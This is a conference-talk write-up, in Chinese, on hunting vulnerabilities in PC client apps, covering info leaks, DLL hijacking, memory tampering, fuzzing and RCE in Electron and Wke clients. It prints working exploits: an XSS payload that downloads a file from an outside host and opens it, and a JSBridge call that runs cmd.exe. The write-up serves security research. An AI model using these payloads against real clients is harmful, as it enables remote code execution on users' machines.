
# 被忽视的暗面：客户端应用漏洞挖掘之旅

## 前言

在2023年12月15日，我有幸参加了由“字节跳动安全中心”举办的“安全范儿”沙龙活动。作为“中孚信息元亨实验室”的一员，我被邀请分享名为“被忽视的暗面：客户端应用漏洞挖掘之旅”的技术议题。

**现整理成文字版分享出来，由于我不是专门从事二进制工作，因此文章中存在笔误或解释不对的地方，请各位师傅多多包涵！**

客户端应用漏洞是许多人在进行漏洞挖掘和安全测试时容易忽视的领域。随着技术的更迭和攻防手段的升级，客户端应用漏洞也逐渐出现在大众视野中（APT攻击、攻防赛事等等），在本次议题中，我们将重点关注PC侧的客户端应用程序，如即时通讯、远程服务、视频软件等应用，探索其中存在的漏洞和潜在的安全风险。

## 漏洞案例

漏洞案例的分析主要分为两类，一是常规风险的介绍和了解，二是RCE漏洞的挖掘思路和手法。

**注意：以下漏洞案例均通过脱敏和细节上的处理。**

### 常规风险篇

常规风险在这里我分为这几类：信息泄露、白利用、逻辑校验、缓冲区溢出。

#### 信息泄漏

对于客户端的信息泄露，我一开始采用的方式就是基于IDA Strings进行敏感的字符串信息匹配，将HaE的规则转为Yara规则再通过FindCrypt3插件进行匹配。

![](upload/attach/202312/943869_7KS39YAJKGH4CEH.png)

实际效果没有那么好，仅有一些数据库的连接配置信息泄露，并且由于是基于IDA的也没有那么好的进行自动批量化发现。

![](upload/attach/202312/943869_84ZU7E8F9PXRUU2.png)

![](upload/attach/202312/943869_XY8SCVCHE3DYBRM.png)

我们可以借助`Strings`工具来快速的获取可执行文件的字符串内容，并通过正则或其他方式进行匹配。

![](upload/attach/202312/943869_5FC3YCHZFU9VK94.png)

#### 白利用

白利用问题就老生常谈了，在红队的工作中也经常遇到，如DLL文件没有经过比对导致的劫持问题、带有签名的程序可以通过参数的方式执行任意命令。因此在这里就不过多的赘述了。

![](upload/attach/202312/943869_5T9EX2P5F66Y7YA.png)

![](upload/attach/202312/943869_8JE56SVTMW3MZ6Z.png)

#### 逻辑校验

很多客户端程序在对用户信息进行获取的时候会通过内存的方式，来获取用户的编号，从而基于此进一步来获取用户的信息。然而这种方式并不是完全可信的，我们可以通过`CE`来对内存进行修改，从而导致越权漏洞的产生。

![](upload/attach/202312/943869_QBRWRYS8VXQ2NSG.png)

这类问题很经典，在以往就有许多案例（`wooyun-2015-0143395`、`wooyun-2014-048606`），但现在仍然可以从一些主流的应用上发现到类似的安全问题。

#### 缓冲区溢出

缓冲区溢出问题太多太多了，我们可以通过通过IDA插件`VulFi`定位脆弱点，很轻松的在一些客户端应用上找到堆、栈溢出问题。除此之外，也可以通过`Boofuzz`来对客户端应用开启的本地网络服务进行Fuzz，从而找到溢出问题。

![](upload/attach/202312/943869_BBR6PG6W5GNV6V3.png)

除了本地网络服务以外，最经典的、利用最多的还是特定文件格式处理客户端，如常用的Word、Excel。我在实际挖掘的过程中找到了一些图片处理的客户端程序，它用于各种各样的图片处理，我们可以找一些比较不常见的图片格式，并且通过网盘资源找到一些样本文件，丢给GPT或IFFA来分析文件格式，并输出Pits脚本，通过Peach Fuzzer来进行Fuzz工作。

![](upload/attach/202312/943869_RQXAAB8K7ZRJYVU.png)

### RCE篇

接着我们来到RCE篇，请注意这里的RCE并不是Pre Auth的，案例中提到的大多需要1 Click进行交互才能利用。但也不是绝对，如果一些客户端的网络服务端口是监听在0.0.0.0的，只要你与目标机器处于同一个网络，或该客户端是在服务器上使用的，也一样可以实现0 Click的效果。

#### Web类客户端

Web类客户端，我的定义是基于HTML、CSS、JS等Web前端技术所构建的客户端应用程序，如Electron这类CEF（浏览器嵌入式）框架开发的客户端应用，以及基于渲染引擎（如Wke）所开发的客户端应用。

##### 某IM客户端应用

如下图所示，是一个即时通讯客户端应用，我在群名称重命名时发现了一个反射XSS漏洞，根据其目录结构我知道它是一个基于Electron开发的程序。

![](upload/attach/202312/943869_2TBAZ574GPUD6X5.png)

在Electron框架下，如果开发者在渲染页面时配置`nodeIntegration`为true，则说明我们可以在前端中使用Nodejs的语法，这就导致我们可以直接在前端使用如下Nodejs代码执行命令：

```nodejs
require('child_process').exec(...);
```

但是这个配置项在创建功能窗口时并没有开启：

![](upload/attach/202312/943869_G4H53Q3QR5VA8Y8.png)

所以，我们也就没办法通过XSS执行Nodejs的代码，但是根据当前的Electron的版本1.8.7去互联网检索，发现这个版本存在一个历史漏洞：`CVE-2018-15685`，而后进行相关验证，也无法成功。

但是我们在`\resources\app\src\inject\preload.js`文件中（这是预加载JS，也就表示这个文件在窗口创建后，页面创建前就执行了），发现了注册的全局变量：

```javascript
window.ZxDesktop = ZxDesktop;
```

所以我们可以直接去调用这个全局变量，从而去使用其内部的定义的一些功能：

![](upload/attach/202312/943869_GD3BEZNSBV59BUX.png)

该全局变量实际上导出了很多其他模块及对应方法：

![](upload/attach/202312/943869_PTKXQFK7GH8QP3C.png)

我们跟进`File`模块，就可以发现存在一个`open`函数：

![](upload/attach/202312/943869_XCSB8YP2CVHFJK3.png)

跟进代码和测试之后，发现它就是文件打开函数，在Console下去调用，成功打开计算器：

![](upload/attach/202312/943869_2TX44BYDG5M7NBZ.png)

接着看导出函数列表的其他项，发现存在两个文件保存的方法：

![](upload/attach/202312/943869_U8J4B79F9ZZ2ZJD.png)

而它们所指向的都是另外一个模块的方法：

```javascript
const Download = require('../download_extra/download.render.js');
```

跟进这个模块，发现实际上他们都来自同一个方法，只不过传递的参数`isSelect`有不同：

![](upload/attach/202312/943869_C6WU4Z85PQ3Q4C2.png)

接着我们来完整的阅读下代码即可发现整个逻辑，首先根据你传递的参数来判断要调用`NormalDownload`（正常下载）还是`ChunkDownload`（分块下载），接着根据`isSelect`函数来判断调用`save`还是`saveAs`方法：

![](upload/attach/202312/943869_64A4QGMPN9JWB3T.png)

所以我们仍然需要跟进`NormalDownload`或`ChunkDownload`对应的代码，来查看它们这些方法的逻辑是什么，这里看了之后，两者代码的唯一区别就是分块，所以本文就以`NormalDownload`的`save`、`saveAs`方法去说明。

首先是`saveAs`方法，它会调用一个文件保存框，然后赋值调用`retryStart`方法：

![](upload/attach/202312/943869_3256NKX84YV996M.png)

而实际上`retryStart`方法内调用的是`start`方法，这个方法是用来进行请求下载的：

![](upload/attach/202312/943869_FZ3V53QZ56XD4FV.png)

而后下载的文件实际上会保存在用户的数据目录下，`save`方法与`saveAs`方法的最大的不同就是没有这个文件保存框，所以我们当然选择使用`save`方法。

需要注意，在如上代码中`save`和`saveAs`的传递参数不一致，其实这不影响最终的处理，因为在一开始的对象创建时候就通过构造函数赋值了：

```javascript
let downloader = new Download(file, config);
```

![](upload/attach/202312/943869_QYS2SN9AMDMRQYR.png)

至此，我们就获得了文件下载的攻击路径，我们可以根据对应参数这样构建JS代码：

```javascript
ZxDesktop.require("File").save({"url": "http://gh0st.cn:81/test.txt","name": "test.txt","path": "","chunkSize": "","size": "","fileData": ""});
```

我们已经获得了文件下载的功能，攻击路径就很明显了：用户下载文件，打开文件。但是实际操作中，我们打开文件还缺少一个路径，并且在实际的测试中，默认情况下，下载的文件是会保存在应用的数据目录的null目录下。

而这个目录可能会被用户更改（用户名也没法获取），所以我们需要搭配一个点去获取路径，在这里找到了`ZxDesktop`的`System`模块：

![](upload/attach/202312/943869_VJYG42WP3RQTC7Z.png)

它的导出列表中有两个属性：`dbPath`、`userDataPath`，它们的内容都是一样的，指向了用户的数据目录：

```javascript
ZxDesktop.require("System").userDataPath
```

我们可以这样拼接，就有了下载文件的目录信息了：

```javascript
ZxDesktop.require("System").userDataPath + "/null/test.txt"
```

当我们满足所有条件后，就可以构造完整的攻击代码了：

1. 下载文件：

   ```javascript
   var a = ZxDesktop;
   var b = a.require("File");
   b.save({"url": "http://gh0st.cn:81/test.txt","name": "test.txt","path": "","chunkSize": "","size": "","fileData": ""});
   ```

2. 拼接文件路径，打开文件：

   ```javascript
   b.open(a.require("System").userDataPath + "/null/test.txt");
   ```

3. 最终Exploit：

   ```html
   "><svg onload='var a = ZxDesktop;var b = a.require("File");b.save({"url": "http://gh0st.cn:81/test.txt","name": "test.txt","path": "","chunkSize": "","size": "","fileData": ""});b.open(a.require("System").dbPath + "/null/test.txt");'>
   ```

![](upload/attach/202312/943869_MUT7AJ2H94QQ5YC.png)

##### 某运维平台客户端

在某运维平台客户端中，我们发现可以通过伪协议链接（`xxx://webview/?url=http://xxxx`）来达到端内任意页面加载，这也就表示我们可以执行任意JS代码。

根据加载的DLL文件得知，其所依赖的前端页面渲染是开源项目<a href="elink@b38K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0k6i4S2W2M7W2)9J5c8Y4N6C8k6b7`.`.">`Wke`</a>。

在源代码`wke/jsBind.cpp`中，发现`wkeJSBindFunction`方法提供了JSBridge的功能，将JavaScript函数绑定到C++中一个本地函数。

![](upload/attach/202312/943869_J9BSSASX35UEPGB.png)

基于IDA分析得知，目标应用使用了该方法将JS函数与C++函数进行了绑定。图下图所示，其将C++某个函数地址，与名为`callprogram`的JavaScript函数进行绑定，我们可以直接在JS代码中调用。

![](upload/attach/202312/943869_X5S59WGG29TZXZX.png)

跟进对应的C++函数，我们发现它会通过`wkeJSParam`获取参数，再通过`JSToTempStringW`获取字符串形式的参数值，最终将两个参数带入`ShellExecuteW`函数执行。即最终执行的代码为：`ShellExecuteW(0, "open", 参数1, 参数2, 0, 1)`。

![](upload/attach/202312/943869_43GMMER9DRPRC4B.png)

因此我们可以构建如下的Exploit代码，并通过伪协议的方式使目标可以打开包含Exp代码的网页：

```html
<script>callprogram("C:/Windows/System32/cmd.exe", "/c calc");</script>
```

#### 传统类客户端

传统类客户端，我的定义是基于C/C++写的一些传统应用，如VPN客户端、视频软件、远程控制软件等偏生活、日常类的应用。

##### 某远程服务平台客户端

在拿到一个客户端程序时，第一步是安装，第二步则应该是先大致去了解该程序的一些目录结构、运行环境等信息，这样我们在接下来的漏洞挖掘中才会有更多的信息来进行关联，辅助我们挖掘漏洞。

如下图所示，安装完某远程服务平台客户端后，我通过火绒剑逐个查看对应的进程信息，在TCP/IP窗口中看见当前进程的网络通信或监听信息。如下图所示就是`UserClient.exe`进程当前的网络通信信息，我们可以看到它在本地监听了两个端口：`38227`、`38230`。

![](upload/attach/202312/943869_5CFNPT3PBS8YV73.png)

它的协议都是TCP，我们可以尝试使用HTTP的方式去访问，结果显示`38230`端口可以以HTTP协议的方式进行访问。

![](upload/attach/202312/943869_9CC58SPE4ZHZ6JK.png)

我们可以选取响应报文中的`bangwo8client`字符串在IDA的Strings窗口中进行搜索，通过这样的方式来进行逻辑的回溯。

![](upload/attach/202312/943869_53QM7DA9FAXWXHY.png)

双击进入字符串所在的`.RDATA`节，我们就可以看到该字符串对应的交叉引用，那么接下来我们的工作就是**进入这些函数看具体实现是否对的上响应报文的主体内容**。

![](upload/attach/202312/943869_QQJ2NM6DHHWUZKE.png)

我们进入一个函数查看，会发现在函数的头部代码中有如下这么一段内容，它的逻辑似乎就对应了HTTP响应报文的主体返回，通过字符串的对应我们能大致知道`sub_487760`函数的作用就是为了将字符串解析到JSON格式中，然后再通过其他函数拼接JSON的字段内容给到`Block`。

![](upload/attach/202312/943869_MF82MTT5GM43TJH.png)

除了我们跟进的这个函数外其他的函数逻辑都大致一样，并且我们通过IDA插件`CTO`查看调用关系，发现这些函数最终都是被同一个函数`sub_674090`调用。

![](upload/attach/202312/943869_GTQQB2T6EZT9PZ7.png)

那我们再继续跟进函数`sub_674090`，函数的逻辑就是根据不同的URI进入不同的函数处理，也就表示着这里就是HTTP请求逻辑处理的入口位置。

![](upload/attach/202312/943869_M66QEG3HAZ2TSWH.png)

有了请求处理逻辑的入口，接下来我们就要去看每个URI对应的处理逻辑是什么，看一下处理的逻辑中是否有参数值可控导致存在的相关漏洞。
